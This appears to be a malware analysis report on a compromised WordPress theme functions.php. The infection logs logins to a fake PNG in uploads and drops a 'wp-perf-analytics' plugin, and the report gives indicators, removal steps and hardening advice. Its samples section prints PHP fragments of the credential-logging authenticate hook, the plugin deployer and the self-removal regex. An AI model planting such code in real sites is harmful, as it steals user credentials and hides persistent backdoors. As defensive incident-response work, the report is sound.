---
title: "Infected WordPress functions.php stealing logins and dropping a fake plugin"
slug: "infected-functions-php-stealing-logins-fake-plugin"
description: "A compromised WordPress theme functions.php can steal successful logins, hide credentials in uploads, and drop a fake wp-perf-analytics plugin for persistence. Learn what to check and how to remove it safely."
reportDate: "2026-04-23"
reportType: "Threat Pattern"
threatType: "Credential theft with plugin-based persistence"
severity: "Critical"
sampleScope: "Representative infected theme file from a larger WordPress compromise; behavior indicates broader site persistence beyond this single functions.php sample."
fileHash: "6a62ef9bd858f00b92050d3d40a9d5adb220861c7763f5761a806a6524853f0a"
detectedPaths: ["functions.php"]
screenshots: ["/images/wordpress-threats/functions.php-malware_evidence-1.png","/images/wordpress-threats/functions.php-malware_evidence-2.png"]
vtLink: "https://www.virustotal.com/gui/home/upload"
vtScore: "Not found / unique sample"
affectedComponents: ["Active theme functions.php","wp-content/plugins/wp-perf-analytics/ fake plugin directory","wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png disguised credential log","Possible plugin activation and persistence state within WordPress"]
entryPoints: ["Compromised theme functions.php executing on every WordPress load","Dropped plugin directory wp-content/plugins/wp-perf-analytics/ if created","Any attacker access obtained through stolen administrator/editor credentials logged by the authenticate hook"]
persistencePoints: ["Theme functions.php injected loader block","Fake plugin wp-content/plugins/wp-perf-analytics/","Flag file under wp-content/.plugin_deployer_<md5> used by the deployer workflow","Credential log stored in uploads for reuse by attacker"]
---

## Quick Answer
If your theme functions.php contains an authenticate hook that writes username:password pairs to uploads, or a __plugin_deployer__ block that creates wp-content/plugins/wp-perf-analytics/, treat the site as fully compromised. Replace the infected theme with a clean copy, remove the fake plugin and deployer flag files, check uploads for the disguised credential log, rotate all WordPress, hosting, database, and FTP passwords, and review for additional persistence such as mu-plugins, rogue admins, and scheduled tasks.

## What This Threat Pattern Is
This is a credential-theft and persistence infection inside a WordPress theme file. The representative infected functions.php sample contains ordinary theme code for a real theme, then appends malicious logic near the end. The first malicious addition hooks into WordPress authentication and captures successful usernames and passwords. The second addition acts as a deployer that writes a fake plugin into wp-content/plugins/wp-perf-analytics/, using embedded base64 data as the plugin payload. The deployer also includes self-cleanup logic so the installer block can remove itself from functions.php after it has done its job. That combination makes this more than a one-file hack: it is a multi-part WordPress backdoor pattern with credential theft and plugin-based persistence.

## What Visitors May See
- Often nothing obvious on the public site at first; this pattern is designed to hide while stealing logins and installing persistence.
- Unexpected plugin entries such as a generic-looking performance or analytics plugin if the attacker wants the dropped plugin to blend in.
- Theme file warnings, broken functionality, or unusual code visible in the Theme File Editor if a site owner inspects functions.php.
- Security plugin alerts about modified theme files, suspicious base64 payloads, or unauthorized plugin creation.
- In some cases, recurring reinfection after the theme file is cleaned because the dropped plugin remains in place.

## Screenshot-Based Symptoms
The screenshots show a theme functions.php file open in a code editor with clearly injected malware near the bottom of the file. One screenshot shows a __plugin_deployer__ section tied to the WordPress init hook, along with logic that references WP_CONTENT_DIR, creates a plugin directory, and uses the slug wp-perf-analytics. Another screenshot shows a long base64-encoded payload assigned for later decoding and writing as plugin code. For a site owner, the visible symptom is not a hacked homepage banner but a normal theme file followed by suspicious credential logging and plugin installer code that does not belong in a legitimate theme.

### Screenshot Findings
- **Code editor open to functions.php showing a long base64_decode payload assigned to $code after plugin deployer logic. The visible lines reference WP_CONTENT_DIR, /plugins/, and slug wp-perf-analytics.** — This screenshot shows the malicious payload staging section where encoded plugin code is embedded into the theme file for later deployment into a fake plugin directory.
- **Code editor open to a theme functions.php path ending in /themes/trighton/functions.php with a comment __plugin_deployer__, init hook, self-clean logic, .plugin_deployer flag creation, and slug set to wp-perf-analytics.** — This screenshot shows the persistence loader embedded in the active theme file. It is intended to write a fake plugin and then erase its own deployer block from functions.php.

## Why This Usually Means the Site Is Compromised
This WordPress threat pattern centers on a compromised theme functions.php file with two high-confidence malicious behaviors: it records successful WordPress usernames and passwords, and it deploys a fake plugin named wp-perf-analytics to keep access after the visible theme infection is removed. In the representative sample reviewed here, the credential logger writes to a file disguised as an image under uploads, while a self-cleaning deployer writes a persistent plugin into wp-content/plugins. Even if the original injected block later disappears from functions.php, the dropped plugin can remain behind.

## Likely Root Cause
The initial entry point is not proven by this sample alone. The available evidence does not show whether the attacker first got in through a vulnerable plugin, compromised hosting credentials, a reused admin password, or another writeable component. What is supported strongly by the code is that once the theme file was modified, it was used to capture valid logins and plant a more durable foothold through a fake plugin.

## Why It Keeps Coming Back
This pattern comes back because cleaning only functions.php is often not enough. The injected theme code is designed to create another component under wp-content/plugins/wp-perf-analytics/, and it uses a flag file under wp-content to manage deployment. It also stores stolen credentials in uploads, which can give the attacker another way back in even after file cleanup. If the plugin remains, if stolen passwords are still valid, or if other persistence points were planted elsewhere, the site can be reinfected quickly.

## Files and Directories to Check
- Active theme directory, especially functions.php
- wp-content/plugins/wp-perf-analytics/
- wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png
- wp-content/.plugin_deployer_*
- wp-content/mu-plugins/
- Other theme files in the same active theme directory
- WordPress users list for unexpected administrator accounts
- Scheduled tasks, cron events, and security or maintenance plugins with recent unexplained changes

## Removal Targets Inferred From The Samples
- **theme_file:** `functions.php` — Representative infected theme functions.php contains both credential theft and plugin deployer code. Replace with a clean vendor/original copy rather than editing in place.
- **plugin_directory:** `wp-content/plugins/wp-perf-analytics/` — Fake plugin directory is explicitly created by the malware as a persistence component and should be removed entirely after preserving forensic evidence if needed.
- **file:** `wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png` — Disguised uploads file is used to store stolen WordPress usernames and passwords, not a legitimate image asset.
- **file:** `wp-content/.plugin_deployer_*` — Flag files are part of the malicious deployer workflow and should be removed during cleanup.
- **theme_directory:** `active theme directory containing functions.php` — Because the supplied functions.php is a representative infected theme file, the whole active theme should be reviewed and ideally replaced from a known-good source to catch adjacent modifications.

## Technical Analysis
The representative infected functions.php sample contains clear malicious logic appended to otherwise normal theme code. One block registers add_filter('authenticate', ... , 999, 3), receives the authentication result, username, and password, and appends successful credentials in username:password format using file_put_contents. The destination path is base64-obfuscated but decodes to wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png, which is a strong sign of disguised credential storage rather than any valid image workflow. A second marked block, beginning with __plugin_deployer__, runs on init, writes a throttle flag under WP_CONTENT_DIR, creates wp-content/plugins/wp-perf-analytics/ if missing, and decodes an embedded base64 blob intended to become plugin code. The deployer then attempts to strip its own marked block from the current file with regex-based self-removal and invalidates opcode cache if available. Those behaviors support a strong conclusion of malicious persistence: the theme file acts as an installer, the fake plugin acts as the longer-term foothold, and the hidden uploads file acts as a credential collection store. Sample SHA256: 6a62ef9bd858f00b92050d3d40a9d5adb220861c7763f5761a806a6524853f0a.

## Attack Chain
1. Attacker gains write access to the WordPress site through an unknown initial vector.
2. Theme functions.php is modified with a credential logger and a plugin deployer.
3. On successful WordPress logins, usernames and passwords are appended to a disguised file under uploads.
4. On init, the deployer creates or refreshes a fake plugin directory named wp-perf-analytics under wp-content/plugins.
5. Embedded base64 data is decoded into plugin code for persistence.
6. The deployer removes its own marked installer block from functions.php to reduce obvious signs.
7. Attacker retains access through the dropped plugin, stolen credentials, or both.

## Evidence Notes
- Representative infected functions.php sample shows an authenticate hook that logs successful credentials only when authentication does not return WP_Error and username and password are non-empty.
- The credential log path decodes to wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png, indicating a disguised storage file masquerading as media.
- The sample contains a visible __plugin_deployer__ marker, a strong indicator of installer-style malware rather than accidental corruption.
- The deployer explicitly sets the slug wp-perf-analytics and targets wp-content/plugins/wp-perf-analytics/.
- The deployer writes a .plugin_deployer_<md5> flag file under wp-content, suggesting deliberate redeployment control.
- The screenshots show the malicious block inside a theme path ending in /themes/trighton/functions.php and a large base64 payload tied to the fake plugin deployment.
- The supplied file is described as a representative sample from a larger cleanup case, so additional persistence elsewhere on the site remains plausible and should be checked.

## Representative Malware Samples
### FILE: `functions.php`
**Why it matters:** Authenticate hook logs successful WordPress credentials to a disguised file under uploads.

```php
add_filter('authenticate', function($u, $l, $p) {
  if(!is_wp_error($u)&&!empty($l)&&!empty($p)){
    @file_put_contents(ABSPATH . '[uploads path disguised as image]', $l . ':' . $p . PHP_EOL, FILE_APPEND);
  }
  return $u;
}, 999, 3);
```

### FILE: `functions.php`
**Why it matters:** Malicious deployer creates a fake plugin directory named wp-perf-analytics under wp-content/plugins.

```php
$slug = 'wp-perf-analytics';
$dir = WP_CONTENT_DIR . '/plugins/' . $slug;
if (!is_dir($dir)) @mkdir($dir, 0755, true);
$code = base64_decode('[redacted encoded plugin payload]');
```

### FILE: `functions.php`
**Why it matters:** Self-cleaning logic attempts to remove the deployer block from the infected theme file after execution, helping the malware hide its original installer.

```php
$clean = preg_replace('/\/\*\s*__plugin_deployer__\s*\*\/[\s\S]*?\/\*\s*__plugin_deployer_end__\s*\*\//', '', $c);
if ($clean !== $c) {
  @file_put_contents($tmp, $clean);
  @rename($tmp, $self);
  if (function_exists('opcache_invalidate')) @opcache_invalidate($self, true);
}
```

## Indicators of Compromise (Public-Safe)
- `6a62ef9bd858f00b92050d3d40a9d5adb220861c7763f5761a806a6524853f0a`
- `wp-perf-analytics`
- `wp-content/uploads/2024/06/Stained_Heart_Red-600x500[.]png`
- `wp-content/[.]plugin_deployer_*`
- `__plugin_deployer__`

## Removal Strategy
Because the representative sample shows credential theft plus a plugin deployer, removal should be handled as a full compromise cleanup, not a quick code edit. Preserve evidence first if you need incident records, then replace compromised files from known-good sources and rotate credentials immediately.

## Manual Removal Protocol
1. Take the site offline or place it in maintenance mode if possible to reduce further credential capture during cleanup.
2. Create a full backup of files and database for forensic purposes before making changes.
3. Download and preserve the infected functions.php sample, the fake plugin directory if present, the disguised uploads file, and any .plugin_deployer flag files as evidence.
4. Replace the infected theme with a clean vendor or original copy. Do not rely on editing out only the visible malicious lines in functions.php.
5. Remove the entire wp-content/plugins/wp-perf-analytics/ directory if it exists, after preserving a copy for analysis if needed.
6. Delete malicious deployer flag files matching wp-content/.plugin_deployer_*.
7. Inspect wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png and similar suspicious media-named files. Treat them as sensitive because they may contain stolen usernames and passwords.
8. Rotate all WordPress user passwords immediately, starting with administrators, editors, authors, and any account that logged in while the infection was active.
9. Rotate hosting panel, SFTP/FTP, SSH, database, and any deployment credentials tied to the site.
10. Force logout of all users and invalidate existing sessions where possible.
11. Review the WordPress users table and admin area for rogue users or changed email addresses.
12. Check wp-content/mu-plugins/, wp-config.php, active plugins, and autoloaded database options for additional loaders or backdoors.
13. Reinstall WordPress core from a clean source if you cannot fully account for all changed files.
14. Scan the full account, not just the WordPress site, for adjacent infected sites or shared hosting cross-contamination.
15. After cleanup, monitor file changes and login events closely for signs of re-entry.

## Hardening Checklist
- Enable multifactor authentication for all administrator accounts.
- Remove unused themes and plugins, especially abandoned commercial packages and bundled theme components.
- Keep WordPress core, plugins, themes, and server software updated.
- Disable direct file editing in the WordPress admin.
- Limit write permissions so the web server cannot freely modify theme and plugin code unless operationally required.
- Use unique passwords for WordPress, hosting, database, and SFTP/SSH accounts.
- Add file integrity monitoring for wp-content and alert on new plugin directories or changes to functions.php, wp-config.php, and mu-plugins.
- Review admin users and roles regularly for unexpected privilege changes.
- Use a web application firewall and malware scanning, but do not treat them as substitutes for file replacement and credential rotation after a confirmed compromise.
- Separate sites into different hosting accounts or containers where possible to reduce cross-site reinfection risk.

## FAQ
### Is this just a suspicious theme customization, or definite malware?
Based on the representative sample, this is definite malware. A legitimate theme does not hook authentication to save successful usernames and passwords into a disguised file under uploads, and it does not silently deploy a fake plugin from an embedded base64 payload.

### Why would credentials be stored in a .png file path?
To hide in plain sight. Attackers often use filenames and locations that look like normal media so site owners are less likely to inspect them. In this case, the path decodes to what appears to be an image in uploads, but the code writes plain credential lines to it.

### If I clean functions.php, am I done?
No. The evidence shows a persistence mechanism that drops a plugin named wp-perf-analytics. If that plugin exists, removing only functions.php will not fully clean the compromise. You also need to rotate passwords because valid credentials may already have been stolen.

### What should I search for on disk?
Start with the exact markers supported by the sample: __plugin_deployer__, wp-perf-analytics, wp-content/.plugin_deployer_*, and the disguised uploads path wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png. Then expand the review to the full active theme, mu-plugins, wp-config.php, and recently modified files across wp-content.

### Could the fake plugin be inactive and still matter?
Yes. Even an inactive-looking plugin directory matters because it may contain backdoor code, may have been active earlier, may be reactivated by other malware, or may simply be one artifact in a broader compromise. It should be preserved for evidence and then removed from the live site.

### Do I need to reset only WordPress passwords?
No. Reset WordPress passwords first, but also rotate hosting control panel, SFTP/FTP, SSH, database, and any API or deployment secrets tied to the site. If the attacker captured admin credentials, they may have used them to add other access paths.

### What if the __plugin_deployer__ block is gone now?
That does not make the site clean. The sample includes self-removal logic, so the installer may delete its own block after writing the plugin. That is why you must also check for the dropped wp-perf-analytics plugin, deployer flag files, and other persistence points.

> **Proof statement:** This assessment is based on representative malware samples and screenshots collected during real WordPress cleanup work by MD Pabel. The conclusions here are grounded in directly observed code behavior from the supplied functions.php sample, including credential logging, disguised storage in uploads, fake plugin deployment, and self-cleaning persistence logic.
>
> **Confidence:** Root cause low, persistence high, screenshot read high, IOCs high.
